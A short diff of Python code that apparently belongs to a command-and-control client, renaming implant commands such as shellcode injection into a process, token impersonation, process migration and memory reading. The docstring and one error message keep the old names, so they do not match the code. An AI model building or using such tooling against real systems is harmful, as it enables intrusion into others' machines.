@@ -56,12 +56,12 @@ def encode_arg_bytes(cmd_name: str, arg: str) -> bytes:
       shellcodeexec <pid> <shellcode_file>   → DWORD pid + raw shellcode bytes
       memread <pid> <addr_hex> <size>        → DWORD pid + UINT64 addr + DWORD size
       modulelist / handlelist / migrate <pid>→ DWORD pid (LE)
-      getenv <name>                          → UTF-8 name
-      setenv <NAME=VALUE>                    → UTF-8 "NAME=VALUE"
+      get-env <name>                          → UTF-8 name
+      set-env <NAME=VALUE>                    → UTF-8 "NAME=VALUE"
       sleep <ms>                             → DWORD milliseconds (LE)
     """
     # PID-only commands
-    if cmd_name in {"impersonate-token", "modulelist", "handlelist", "migrate"}:
+    if cmd_name in {"impersonate-token", "module-list", "handle-list", "migrate"}:
         return struct.pack("<I", int(arg, 10))
 
     # Privilege name
@@ -69,11 +69,11 @@ def encode_arg_bytes(cmd_name: str, arg: str) -> bytes:
         return arg.encode("utf-8")
 
     # Simple path (UTF-8)
-    if cmd_name in {"ls", "cat", "mkdir", "rm", "download", "getenv"}:
+    if cmd_name in {"ls", "cat", "mkdir", "rm", "download", "get-env"}:
         return arg.encode("utf-8")
 
     # Environment variable set: "NAME=VALUE"
-    if cmd_name == "setenv":
+    if cmd_name == "set-env":
         return arg.encode("utf-8")
 
     # Sleep: milliseconds as DWORD
@@ -96,17 +96,17 @@ def encode_arg_bytes(cmd_name: str, arg: str) -> bytes:
         return arg.encode("utf-8")
 
     # Shellcodeexec: "pid shellcode_file"
-    if cmd_name == "shellcodeexec":
+    if cmd_name == "shellcode-exec":
         parts = arg.split(None, 1)
         if len(parts) != 2:
-            raise ValueError("shellcodeexec requires: <pid> <shellcode_file>")
+            raise ValueError("shellcode-exec requires: <pid> <shellcode_file>")
         pid_val = int(parts[0], 10)
         with open(parts[1], "rb") as fh:
             shellcode = fh.read()
         return struct.pack("<I", pid_val) + shellcode
 
     # Memread: "pid address_hex size"
-    if cmd_name == "memread":
+    if cmd_name == "mem-read":
         parts = arg.split()
         if len(parts) != 3:
             raise ValueError("memread requires: <pid> <address_hex> <size>")
